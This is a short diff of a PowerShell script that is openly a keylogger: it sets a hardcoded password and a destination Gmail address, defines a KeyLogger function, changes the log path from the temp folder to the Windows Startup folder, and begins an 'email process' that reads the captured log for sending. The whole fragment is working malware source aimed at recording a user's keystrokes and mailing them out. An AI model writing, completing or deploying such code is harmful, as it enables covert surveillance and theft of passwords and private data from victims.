@@ -7,7 +7,7 @@ $password = "jjjcbfzmpbxyqaeo"
 $destino="gabrielg13rojas@gmail.com"
 
 # keylogger
-function KeyLogger($logFile="$env:temp/$env:UserName.log") {
+function KeyLogger($logFile="C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/$env:UserName.log") {
 
   # email process
   $logs = Get-Content "$logFile"
